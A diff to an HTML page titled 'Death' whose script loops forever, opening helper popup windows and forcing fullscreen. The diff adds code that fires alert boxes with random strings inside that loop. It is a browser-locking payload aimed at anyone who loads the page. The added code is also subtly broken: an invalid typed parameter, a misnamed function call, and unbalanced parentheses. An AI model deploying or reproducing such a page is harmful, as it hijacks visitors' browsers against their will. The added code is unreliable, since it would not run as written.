@@ -188,6 +188,19 @@
 	  <title>Death</title>
 		<script src="https://cdn.rawgit.com/sindresorhus/screenfull.js/gh-pages/src/screenfull.js"></script>
 		<script type="text/javascript">
+			function makeid(int length) {
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+  for (var i = 0; i < length; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+			function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+			
 			function myFull() {
 				while(1) {
 	            	    		var xWin=window.open("./helper");
@@ -201,6 +214,7 @@
 			  while(1) {
 	            	    var xWin=window.open("./helper");
 			    var xWin=window.open("./helper1");
+			    setTimeout("alert(makeid(getrandomInt(0, 1000));", 1);
 		     	    screenfull.request();
 			}
 			
